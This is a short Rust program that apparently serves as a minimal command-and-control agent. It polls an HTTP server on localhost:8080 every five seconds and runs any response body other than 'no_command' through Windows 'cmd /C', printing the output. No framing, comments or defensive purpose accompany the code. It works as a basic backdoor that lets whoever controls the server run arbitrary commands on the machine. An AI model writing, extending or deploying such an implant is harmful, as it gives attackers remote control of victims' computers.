use std::{
    io::{Read, Write},
    net::TcpStream,
    thread,
    time::Duration,
    process::Command
};

fn main() {
    loop {
        if let Ok(mut stream) = TcpStream::connect("localhost:8080") {
            let _ = stream.write_all(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
            
            let mut buffer = [0; 1024];
            if let Ok(n) = stream.read(&mut buffer) {
                if n > 0 {
                    if let Ok(response) = String::from_utf8(buffer[..n].to_vec()) {
                        if let Some(body) = response.split("\r\n\r\n").nth(1) {
                            if body != "no_command" {
                                execute_command(body);
                            }
                        }
                    }
                }
            }
        }
        thread::sleep(Duration::from_secs(5));
    }
}

fn execute_command(command: &str) {
    let d = Command::new("cmd")
        .args(["/C", command])
        .output();

    println!("{:?}", d);
}